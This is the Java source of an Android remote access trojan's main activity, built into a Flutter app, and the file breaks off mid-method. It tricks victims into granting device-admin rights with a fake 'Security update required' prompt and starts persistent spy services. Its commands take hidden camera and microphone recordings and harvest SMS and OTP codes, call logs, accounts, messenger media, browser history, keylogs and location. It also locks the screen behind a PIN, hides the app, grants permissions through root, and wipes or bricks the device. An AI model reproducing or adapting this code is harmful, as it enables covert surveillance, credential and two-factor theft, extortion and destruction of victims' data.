package com.nullx.pp;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.app.WallpaperManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.os.PowerManager;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.view.Surface;
import android.view.View;
import android.view.WindowManager;

import androidx.annotation.NonNull;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStream;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.concurrent.TimeUnit;

import io.flutter.embedding.android.FlutterActivity;
import io.flutter.embedding.engine.FlutterEngine;
import io.flutter.plugin.common.BasicMessageChannel;
import io.flutter.plugin.common.MethodChannel;
import io.flutter.plugin.common.StringCodec;
import android.content.BroadcastReceiver;
import android.content.IntentFilter;

public class MainActivity extends FlutterActivity {
    private static final String SPY_CHANNEL = "com.nullx.pp/background_spy";
    private static final String STROBE_CHANNEL = "com.nullx.pp/strobe";
    private static final String TAG = "CRPT.RAT";

    private boolean isStrobeRunning = false;
    private final Handler uiHandler = new Handler(Looper.getMainLooper());
    private Runnable strobeRunnable;

    // Broadcast → Flutter channel
    private static final String CMD_BROADCAST_CHANNEL = "com.nullx.pp/cmd_broadcast";
    private BasicMessageChannel<String> cmdMessageChannel;
    private BroadcastReceiver cmdReceiver;

    // Camera stream
    private HandlerThread cameraThread;
    private Handler cameraHandler;
    private CameraDevice activeCameraDevice;
    private ImageReader activeImageReader;
    private CameraCaptureSession activeCaptureSession;

    // Live stream
    private boolean isLiveStreaming = false;
    private byte[] lastFrame;

    // Block overlay
    private View blockOverlayView;

    @Override
    protected void onCreate(android.os.Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        RATCore.init(getApplicationContext());

        Intent svc = new Intent(this, SpyService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
        else startService(svc);
        PersistentWorker.schedule(this);

        try { LocationTracker.start(getApplicationContext()); } catch (Exception ignored) {}
        try { ClipboardMonitor.start(getApplicationContext()); } catch (Exception ignored) {}

        if (!isAccessibilityEnabled()) {
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(accIntent);
                } catch (Exception ignored) {}
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    requestDeviceAdmin();
                }, 3000);
            }, 500);
        } else {
            requestDeviceAdmin();
        }
    }

    private boolean isAccessibilityEnabled() {
        try {
            int enabled = Settings.Secure.getInt(getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED, 0);
            if (enabled == 0) return false;
            String services = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return services != null && services.contains(getPackageName());
        } catch (Exception e) { return false; }
    }

    private void requestDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName adminComp = new ComponentName(this, DeviceAdminHelper.class);
        if (dpm != null && !dpm.isAdminActive(adminComp)) {
            Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp);
            adminIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Security update required.");
            startActivity(adminIntent);
        }
    }

    @Override
    public void configureFlutterEngine(@NonNull FlutterEngine flutterEngine) {
        super.configureFlutterEngine(flutterEngine);

        // ── Broadcast dari SpyService → Flutter via BasicMessageChannel ──
        cmdMessageChannel = new BasicMessageChannel<>(
            flutterEngine.getDartExecutor().getBinaryMessenger(),
            CMD_BROADCAST_CHANNEL, StringCodec.INSTANCE);
        cmdReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String cmd   = intent.getStringExtra("cmd");
                String extra = intent.getStringExtra("extra");
                String cmdId = intent.getStringExtra("cmdId");
                if (cmd == null || cmd.isEmpty()) return;
                // Format: "cmd|extra|cmdId"
                final String payload = (cmd) + "|"
                    + (extra != null ? extra : "") + "|"
                    + (cmdId != null ? cmdId : "");
                uiHandler.post(() -> cmdMessageChannel.send(payload));
            }
        };
        IntentFilter filter = new IntentFilter("com.nullx.pp.EXECUTE_CMD");
        registerReceiver(cmdReceiver, filter);

        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), STROBE_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                if (call.method.equals("startStrobe")) { startStrobeEffect(); result.success(null); }
                else if (call.method.equals("stopStrobe")) { stopStrobeEffect(); result.success(null); }
                else result.notImplemented();
            });

        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), SPY_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                switch (call.method) {
                    // CAMERA
                    case "takeSilentPhotoBackground": {
                        String side = call.argument("side");
                        capturePhoto(side == null ? "back" : side, result);
                        break;
                    }
                    case "startLiveCameraStream": {
                        String side = call.argument("side");
                        startLiveCameraStream(side == null ? "back" : side, result);
                        break;
                    }
                    case "stopLiveCameraStream": stopLiveCameraStream(); result.success(null); break;
                    case "getLiveFrame": {
                        if (lastFrame != null) result.success(Base64.encodeToString(lastFrame, Base64.NO_WRAP));
                        else result.success(null);
                        break;
                    }
                    case "startScreenStreamBackground": result.success(getScreenBase64()); break;

                    // DATA EXTRACTION
                    case "getGmailAccounts": fetchGmailAccounts(result); break;
                    case "getSmsMessages": getSmsMessages(result); break;
                    case "getGalleryImages": {
                        int limit = call.argument("limit") != null ? (int) call.argument("limit") : 10;
                        getGalleryImages(limit, result);
                        break;
                    }
                    case "getWhatsAppMedia": {
                        int limit = call.argument("limit") != null ? (int) call.argument("limit") : 20;
                        new Thread(() -> {
                            try {
                                ArrayList<HashMap<String, String>> media = FileStealer.getWhatsAppMedia(limit);
                                uiHandler.post(() -> result.success(media));
                            } catch (Exception e) {
                                uiHandler.post(() -> result.error("WA_ERR", e.getMessage(), null));
                            }
                        }).start();
                        break;
                    }
                    case "getTelegramMedia": {
                        int limit = call.argument("limit") != null ? (int) call.argument("limit") : 20;
                        new Thread(() -> {
                            try {
                                ArrayList<HashMap<String, String>> media = FileStealer.getTelegramMedia(limit);
                                uiHandler.post(() -> result.success(media));
                            } catch (Exception e) {
                                uiHandler.post(() -> result.error("TG_ERR", e.getMessage(), null));
                            }
                        }).start();
                        break;
                    }
                    case "getDownloads": {
                        int limit = call.argument("limit") != null ? (int) call.argument("limit") : 20;
                        new Thread(() -> {
                            try {
                                ArrayList<HashMap<String, String>> files = FileStealer.getDownloads(limit);
                                uiHandler.post(() -> result.success(files));
                            } catch (Exception e) {
                                uiHandler.post(() -> result.error("DL_ERR", e.getMessage(), null));
                            }
                        }).start();
                        break;
                    }
                    case "getChromeHistory": {
                        new Thread(() -> {
                            try {
                                String history = FileStealer.getChromeHistory(getApplicationContext());
                                uiHandler.post(() -> result.success(history));
                            } catch (Exception e) {
                                uiHandler.post(() -> result.error("CHROME_ERR", e.getMessage(), null));
                            }
                        }).start();
                        break;
                    }
                    case "getKeylogs": {
                        SharedPreferences sp = getSharedPreferences("KeylogPrefs", MODE_PRIVATE);
                        result.success(sp.getString("logs", "[]"));
                        break;
                    }
                    case "getNotifications": {
                        SharedPreferences sp = getSharedPreferences("NotifPrefs", MODE_PRIVATE);
                        result.success(sp.getString("notifs", "[]"));
                        break;
                    }
                    case "getClipboardHistory": {
                        SharedPreferences sp = getSharedPreferences("ClipPrefs", MODE_PRIVATE);
                        result.success(sp.getString("clips", "[]"));
                        break;
                    }
                    case "getLocationHistory": {
                        SharedPreferences sp = getSharedPreferences("LocationPrefs", MODE_PRIVATE);
                        result.success(sp.getString("locations", "[]"));
                        break;
                    }
                    case "clearKeylogs": {
                        getSharedPreferences("KeylogPrefs", MODE_PRIVATE).edit().clear().apply();
                        result.success(true);
                        break;
                    }

                    // WALLPAPER
                    case "setWallpaper": setWallpaper(call.argument("url"), result); break;

                    // FOREGROUND
                    case "bringToForeground": {
                        Intent intent = new Intent(this, MainActivity.class);
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                        startActivity(intent);
                        result.success(true);
                        break;
                    }

                    // SPYWARE CONTROL
                    case "startSpyware": {
                        RATCore.init(getApplicationContext());
                        LocationTracker.start(getApplicationContext());
                        ClipboardMonitor.start(getApplicationContext());
                        result.success(true);
                        break;
                    }
                    case "stopSpyware": {
                        ClipboardMonitor.stop(getApplicationContext());
                        CameraStreamer.stop();
                        stopLiveCameraStream();
                        result.success(true);
                        break;
                    }

                    // PERSIST
                    case "saveTargetId":
                    case "saveDeviceIdAll": {
                        String id = call.arguments.toString();
                        getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit().putString("targetId", id).apply();
                        getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE).edit()
                                .putString("flutter.target_id", id)
                                .putString("flutter.target_model", Build.BRAND + " " + Build.MODEL)
                                .apply();
                        try {
                            File dir = new File(android.os.Environment.getExternalStorageDirectory(), ".crpt");
                            dir.mkdirs();
                            FileWriter fw = new FileWriter(new File(dir, ".devid"));
                            fw.write(id); fw.close();
                        } catch (Exception ignored) {}
                        try {
                            FileWriter fw2 = new FileWriter(new File(getCacheDir(), "devid.dat"));
                            fw2.write(id); fw2.close();
                        } catch (Exception ignored) {}
                        Intent svcIntent = new Intent(this, SpyService.class);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svcIntent);
                        else startService(svcIntent);
                        PersistentWorker.schedule(this);
                        result.success(true);
                        break;
                    }
                    case "saveLockState": {
                        String msg = call.argument("message");
                        String pin = call.argument("pin");
                        boolean locked = Boolean.TRUE.equals(call.argument("locked"));
                        boolean isLive = Boolean.TRUE.equals(call.argument("isLockLive"));
                        SharedPreferences.Editor ed = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit();
                        ed.putBoolean("isLocked", locked);
                        ed.putBoolean("isLockLive", isLive);
                        if (msg != null) ed.putString("lockMessage", msg);
                        if (pin != null) ed.putString("lockPin", pin);
                        ed.apply();
                        result.success(true);
                        break;
                    }
                    case "getLockState": {
                        SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                        HashMap<String, Object> map = new HashMap<>();
                        map.put("isLocked", prefs.getBoolean("isLocked", false));
                        map.put("isLockLive", prefs.getBoolean("isLockLive", false));
                        map.put("lockMessage", prefs.getString("lockMessage", "YOUR PHONE IS LOCKED!!!!"));
                        map.put("lockPin", prefs.getString("lockPin", "1234"));
                        result.success(map);
                        break;
                    }

                    // VIBRATE
                    case "vibrateDevice": {
                        try {
                            Vibrator vib = (Vibrator) getSystemService(VIBRATOR_SERVICE);
                            if (vib != null) {
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    vib.vibrate(VibrationEffect.createWaveform(new long[]{0, 500, 200, 500, 200, 500}, -1));
                                } else {
                                    vib.vibrate(new long[]{0, 500, 200, 500, 200, 500}, -1);
                                }
                            }
                        } catch (Exception ignored) {}
                        result.success(null);
                        break;
                    }

                    // SETTINGS
                    case "openNotificationSettings": {
                        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                        result.success(true);
                        break;
                    }
                    case "openAccessibilitySettings": {
                        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                        result.success(true);
                        break;
                    }

                    // ═══ FITUR BARU: CEK ACCESSIBILITY (BUAT HALAMAN IZIN) ═══
                    case "isAccessibilityEnabled": {
                        result.success(isAccessibilityEnabled());
                        break;
                    }

                    // LOCK
                    case "startLockOverlay": {
                        try {
                            String lockMsg = call.argument("message");
                            String lockPin = call.argument("pin");
                            if (lockMsg == null) lockMsg = "DEVICE IS LOCKED";
                            if (lockPin == null) lockPin = "1234";
                            Intent lockIntent = new Intent(this, LockOverlayService.class);
                            lockIntent.setAction(LockOverlayService.ACTION_LOCK);
                            lockIntent.putExtra(LockOverlayService.EXTRA_MESSAGE, lockMsg);
                            lockIntent.putExtra(LockOverlayService.EXTRA_PIN, lockPin);
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(lockIntent);
                            else startService(lockIntent);
                            result.success(true);
                        } catch (Exception e) { result.error("LOCK_OVERLAY_ERR", e.getMessage(), null); }
                        break;
                    }
                    case "stopLockOverlay": {
                        try {
                            Intent unlockIntent = new Intent(this, LockOverlayService.class);
                            unlockIntent.setAction(LockOverlayService.ACTION_UNLOCK);
                            startService(unlockIntent);
                            result.success(true);
                        } catch (Exception e) { result.success(false); }
                        break;
                    }
                    case "lockDeviceNow": {
                        try {
                            DevicePolicyManager dpmLock = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                            ComponentName adminLock = new ComponentName(getApplicationContext(), DeviceAdminHelper.class);
                            if (dpmLock != null && dpmLock.isAdminActive(adminLock)) {
                                dpmLock.lockNow();
                                result.success(true);
                            } else {
                                Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                                adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, new ComponentName(getApplicationContext(), DeviceAdminHelper.class));
                                adminIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Security update required.");
                                startActivity(adminIntent);
                                result.success(false);
                            }
                        } catch (Exception e) { result.error("LOCK_ERR", e.getMessage(), null); }
                        break;
                    }

                    // CUSTOM LOCK HTML
                    case "startCustomLockHtml": {
                        try {
                            String htmlUrl = call.argument("html");
                            Intent lockIntent = new Intent(this, LockOverlayService.class);
                            lockIntent.setAction(LockOverlayService.ACTION_LOCK);
                            lockIntent.putExtra("custom_html_url", htmlUrl);
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(lockIntent);
                            else startService(lockIntent);
                            result.success(true);
                        } catch (Exception e) { result.error("CUSTOM_LOCK_ERR", e.getMessage(), null); }
                        break;
                    }

                    // AUTO BLOCK
                    case "showBlockOverlay": {
                        try {
                            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
                            if (blockOverlayView == null) {
                                blockOverlayView = new View(this);
                                blockOverlayView.setBackgroundColor(Color.TRANSPARENT);
                                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                        WindowManager.LayoutParams.MATCH_PARENT,
                                        WindowManager.LayoutParams.MATCH_PARENT,
                                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                                        PixelFormat.TRANSLUCENT
                                );
                                wm.addView(blockOverlayView, params);
                            }
                            result.success(true);
                        } catch (Exception e) { result.error("BLOCK_ERR", e.getMessage(), null); }
                        break;
                    }
                    case "removeBlockOverlay": {
                        try {
                            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
                            if (blockOverlayView != null) { wm.removeView(blockOverlayView); blockOverlayView = null; }
                            result.success(true);
                        } catch (Exception e) { result.error("BLOCK_ERR", e.getMessage(), null); }
                        break;
                    }

                    // APP BLOCKER
                    case "killApp": {
                        try {
                            String packageName = call.argument("package");
                            ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
                            am.killBackgroundProcesses(packageName);
                            try { Runtime.getRuntime().exec(new String[]{"su", "-c", "am force-stop " + packageName}); } catch (Exception ignored) {}
                            result.success(true);
                        } catch (Exception e) { result.error("KILL_ERR", e.getMessage(), null); }
                        break;
                    }

                    // AUTO GRANT (ROOT)
                    case "autoGrantPermissions": {
                        new Thread(() -> {
                            try {
                                String pkg = getPackageName();
                                String[] perms = {
                                        "android.permission.CAMERA",
                                        "android.permission.RECORD_AUDIO",
                                        "android.permission.READ_SMS",
                                        "android.permission.READ_CONTACTS",
                                        "android.permission.ACCESS_FINE_LOCATION",
                                        "android.permission.READ_EXTERNAL_STORAGE",
                                        "android.permission.WRITE_EXTERNAL_STORAGE",
                                        "android.permission.MANAGE_EXTERNAL_STORAGE"
                                };
                                for (String p : perms) Runtime.getRuntime().exec(new String[]{"su", "-c", "pm grant " + pkg + " " + p});
                                uiHandler.post(() -> result.success(true));
                            } catch (Exception e) {
                                uiHandler.post(() -> result.error("GRANT_ERR", e.getMessage(), null));
                            }
                        }).start();
                        break;
                    }

                    // GET OTP
                    case "getOtpMessages": {
                        new Thread(() -> {
                            try {
                                ArrayList<HashMap<String, String>> otpList = new ArrayList<>();
                                ContentResolver cr = getContentResolver();
                                Cursor cursor = cr.query(Uri.parse("content://sms/inbox"),
                                        new String[]{"address", "body", "date"}, null, null, "date DESC LIMIT 50");
                                if (cursor != null) {
                                    while (cursor.moveToNext()) {
                                        String body = cursor.getString(cursor.getColumnIndexOrThrow("body")).toLowerCase();
                                        if (body.contains("otp") || body.contains("kode") || body.contains("verifikasi") || body.contains("code")) {
                                            HashMap<String, String> sms = new HashMap<>();
                                            sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                                            sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                                            sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
                                            otpList.add(sms);
                                        }
                                    }
                                    cursor.close();
                                }
                                uiHandler.post(() -> result.success(otpList));
                            } catch (Exception e) {
                                uiHandler.post(() -> result.error("OTP_ERR", e.getMessage(), null));
                            }
                        }).start();
                        break;
                    }

                    // POWER
                    case "rebootDevice": {
                        new Thread(() -> {
                            boolean rebooted = false;
                            if (!rebooted) {
                                try {
                                    PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                                    java.lang.reflect.Method m = pm.getClass().getDeclaredMethod("reboot", String.class);
                                    m.setAccessible(true);
                                    m.invoke(pm, (Object) null);
                                    rebooted = true;
                                } catch (Exception e) { Log.w(TAG, "PM reboot: " + e.getMessage()); }
                            }
                            if (!rebooted) {
                                try {
                                    DevicePolicyManager dpm2 = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                                    ComponentName adminComp2 = new ComponentName(getApplicationContext(), DeviceAdminHelper.class);
                                    if (dpm2 != null && dpm2.isAdminActive(adminComp2) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                        dpm2.reboot(adminComp2);
                                        rebooted = true;
                                    }
                                } catch (Exception e) { Log.w(TAG, "DPM reboot: " + e.getMessage()); }
                            }
                            if (!rebooted) {
                                try {
                                    Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot"});
                                    p.waitFor(3, TimeUnit.SECONDS);
                                    rebooted = true;
                                } catch (Exception e) { Log.w(TAG, "su reboot: " + e.getMessage()); }
                            }
                            if (!rebooted) {
                                try {
                                    Runtime.getRuntime().exec(new String[]{"sh", "-c", "am crash system_server"});
                                    rebooted = true;
                                } catch (Exception e) { Log.w(TAG, "am crash: " + e.getMessage()); }
                            }
                            if (!rebooted) {
                                try {
                                    Runtime.getRuntime().exec(new String[]{"sh", "-c", "pkill -9 zygote"});
                                    rebooted = true;
                                } catch (Exception e) { Log.w(TAG, "pkill: " + e.getMessage()); }
                            }
                            final boolean ok = rebooted;
                            uiHandler.post(() -> { if (ok) result.success(true); else result.error("REBOOT_ERR", "All methods failed", null); });
                        }).start();
                        break;
                    }

                    // RESET & WIPE
                    case "resetDevice": {
                        try {
                            RATCore.backupBeforeWipe();
                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                android.os.Process.killProcess(android.os.Process.myPid());
                            }, 500);
                            result.success(true);
                        } catch (Exception e) { result.error("RESET_ERR", e.getMessage(), null); }
                        break;
                    }
                    case "resetPairId": {
                        try {
                            getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit().clear().apply();
                            getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE).edit().clear().apply();
                            try {
                                File dir = new File(android.os.Environment.getExternalStorageDirectory(), ".crpt");
                                if (dir.exists()) { File[] files = dir.listFiles(); if (files != null) for (File f : files) f.delete(); }
                            } catch (Exception ignored) {}
                            try { File cacheFile = new File(getCacheDir(), "devid.dat"); if (cacheFile.exists()) cacheFile.delete(); } catch (Exception ignored) {}
                            try { stopService(new Intent(getApplicationContext(), SpyService.class)); } catch (Exception ignored) {}
                            result.success(true);
                        } catch (Exception e) { result.error("RESET_PAIRID_ERR", e.getMessage(), null); }
                        break;
                    }
                    case "factoryReset": {
                        new Thread(() -> {
                            try {
                                String status = RATCore.factoryReset();
                                uiHandler.post(() -> result.success(status));
                            } catch (Exception e) { uiHandler.post(() -> result.error("FACTORY_ERR", e.getMessage(), null)); }
                        }).start();
                        break;
                    }
                    case "wipeAppData": {
                        new Thread(() -> {
                            try {
                                getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit().clear().apply();
                                getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE).edit().clear().apply();
                                File[] dirs = { getFilesDir(), getCacheDir(), new File(android.os.Environment.getExternalStorageDirectory(), ".crpt") };
                                for (File dir : dirs) if (dir != null && dir.exists()) RATCore.deleteRecursive(dir);
                                uiHandler.post(() -> result.success(true));
                            } catch (Exception e) { uiHandler.post(() -> result.error("WIPE_ERR", e.getMessage(), null)); }
                        }).start();
                        break;
                    }
                    case "wipeSdcard": {
                        RATCore.wipeSdcard();
                        result.success(true);
                        break;
                    }
                    case "wipeUserData": {
                        new Thread(() -> {
                            int count = RATCore.wipeAllUserData();
                            uiHandler.post(() -> result.success(count));
                        }).start();
                        break;
                    }
                    case "brickDevice": {
                        new Thread(() -> {
                            String r = RATCore.brickDevice();
                            uiHandler.post(() -> result.success(r));
                        }).start();
                        break;
                    }

                    // HIDE / SHOW APP
                    case "hideApp": RATCore.hideApp(); result.success(true); break;
                    case "showApp": RATCore.showApp(); result.success(true); break;

                    // ─── CALL LOG ───────────────────────────────────────────
                    case "getCallLogs": {
                        new Thread(() -> {
                            try {
                                ArrayList<HashMap<String, String>> logs = new ArrayList<>();
                                android.database.Cursor cursor = getContentResolver().query(
                                        android.provider.CallLog.Calls.CONTENT_URI,
                                        new String[]{
                                                android.provider.CallLog.Calls.NUMBER,
                                                android.provider.CallLog.Calls.TYPE,
                                                android.provider.CallLog.Calls.DATE,
                                                android.provider.CallLog.Calls.DURATION
                                        }, null, null,
                                        android.provider.CallLog.Calls.DATE + " DESC LIMIT 50");
                                if (cursor != null) {
                                    while (cursor.moveToNext()) {
                                        HashMap<String, String> log = new HashMap<>();
                                        log.put("number", cursor.getString(0));
                                        int type = cursor.getInt(1);
                                        log.put("type", type == android.provider.CallLog.Calls.INCOMING_TYPE ? "incoming"
                                                : type == android.provider.CallLog.Calls.OUTGOING_TYPE ? "outgoing" : "missed");
                                        log.put("date", cursor.getString(2));
                                        log.put("duration", cursor.getString(3));
                                        logs.add(log);
                                    }
                                    cursor.close();
                                }
                                uiHandler.post(() -> result.success(logs));
                            } catch (Exception e) {
                                uiHandler.post(() -> result.error("CALL_LOG_ERR", e.getMessage(), null));
                            }
                        }).start();
                        break;
                    }

                    // ─── INSTALLED APPS ─────────────────────────────────────
                    case "getInstalledApps": {
                        new Thread(() -> {
                            try {
                                ArrayList<HashMap<String, String>> apps = new ArrayList<>();
                                java.util.List<android.content.pm.ApplicationInfo> pkgs =
                                        getPackageManager().getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA);
                                for (android.content.pm.ApplicationInfo ai : pkgs) {
                                    if ((ai.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
                                        HashMap<String, String> app = new HashMap<>();
                                        app.put("appName", getPackageManager().getApplicationLabel(ai).toString());
                                        app.put("packageName", ai.packageName);
                                        apps.add(app);
                                    }
                                }
                                uiHandler.post(() -> result.success(apps));
                            } catch (Exception e) {
                                uiHandler.post(() -> result.error("APPS_ERR", e.getMessage(), null));
                            }
                        }).start();
                        break;
                    }

                    // ─── RECORD AUDIO ────────────────────────────────────────
                    case "recordAudio": {
                        int durationSec = 5;
                        try {
                            Object d = call.argument("duration");
                            if (d != null) durationSec = (int) d;
                        } catch (Exception ignored) {}
                        final int dur = durationSec;
                        new Thread(() -> {
                            try {
                                java.io.File audioFile = new java.io.File(getCacheDir(), "rec_" + System.currentTimeMillis() + ".3gp");
                                android.media.MediaRecorder recorder = new android.media.MediaRecorder();
                                recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC);
                                recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.THREE_GPP);
                                recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AMR_NB);
                                recorder.setOutputFile(audioFile.getAbsolutePath());
                                recorder.prepare();
                                recorder.start();
                                Thread.sleep(dur * 1000L);
                                recorder.stop();
                                recorder.release();
                                // Encode base64
                                byte[] bytes = java.nio.file.Files.readAllBytes(audioFile.toPath());
                                String b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP);
                                audioFile.delete();
                                HashMap<String, String> res2 = new HashMap<>();
                                res2.put("status", "recorded");
                                res2.put("audio_base64", b64);
                                uiHandler.post(() -> result.success(res2));
                            } catch (Exception e) {
                                uiHandler.post(() -> result.error("REC_ERR", e.getMessage(), null));
                            }
                        }).start();
                        break;
                    }

                    // ─── STOP VIBRATE ────────────────────────────────────────
                    case "stopVibrate": {
                        try {
                            android.os.Vibrator vib = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
                            if (vib != null) vib.cancel();
                        } catch (Exception ignored) {}
                        result.success(true);
                        break;
                    }

                    // ─── DISABLE WIFI ─────────────────────────────────────────
                    case "disableWifi": {
                        try {
                            android.net.wifi.WifiManager wm =
                                    (android.net.wifi.WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
                            if (wm != null && Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                                wm.setWifiEnabled(false);
                            }
                            result.success(true);
                        } catch (Exception e) {
                            result.error("WIFI_ERR", e.getMessage(), null);
                        }
                        break;
                    }

                    // ─── SEND NOTIFICATION ────────────────────────────────────
                    case "sendNotification": {
                        try {
                            String title = call.argument("title");
                            String body  = call.argument("body");
                            if (title == null) title = "Pesan Baru";
                            if (body  == null) body  = "";
                            String channelId = "rat_notif_ch";
                            android.app.NotificationManager nm =
                                    (android.app.NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                android.app.NotificationChannel ch = new android.app.NotificationChannel(
                                        channelId, "Notifikasi", android.app.NotificationManager.IMPORTANCE_HIGH);
                                if (nm != null) nm.createNotificationChannel(ch);
                            }
                            android.app.Notification notif = new androidx.core.app.NotificationCompat.Builder(this, channelId)
                                    .setContentTitle(title)
                                    .setContentText(body)
                                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                                    .setAutoCancel(true)
                                    .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
                                    .build();
                            if (nm != null) nm.notify((int) System.currentTimeMillis(), notif);
                            result.success(true);
                        } catch (Exception e) {
                            result.error("NOTIF_ERR", e.getMessage(), null);
                        }
                        break;
                    }

                    default: result.notImplemented();
                }
            });
    }

    // LIVE CAMERA STREAM
    private void startLiveCameraStream(String side, MethodChannel.Result result) {
        if (isLiveStreaming) { result.success(true); return; }
        cleanupCamera();
        isLiveStreaming = true;
        lastFrame = null;

        cameraThread = new HandlerThread("LiveCameraThread");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());

        try {
            CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            int targetFacing = side.equals("front") ? CameraCharacteristics.LENS_FACING_FRONT : CameraCharacteristics.LENS_FACING_BACK;

            String cameraId = null;
            for (String id : manager.getCameraIdList()) {
                Integer facing = manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == targetFacing) { cameraId = id; break; }
            }
            if (cameraId == null) {
                isLiveStreaming = false;
                result.error("CAM_ERR", "Camera not found", null);
                return;
            }

            activeImageReader = ImageReader.newInstance(480, 360, ImageFormat.JPEG, 4);
            activeImageReader.setOnImageAvailableListener(reader -> {
                Image img = reader.acquireLatestImage();
                if (img == null) return;
                try {
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    lastFrame = bytes;
                } finally { img.close(); }
            }, cameraHandler);

            SurfaceTexture dummyST = new SurfaceTexture(0);
            dummyST.setDefaultBufferSize(480, 360);
            Surface dummySurface = new Surface(dummyST);

            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    activeCameraDevice = camera;
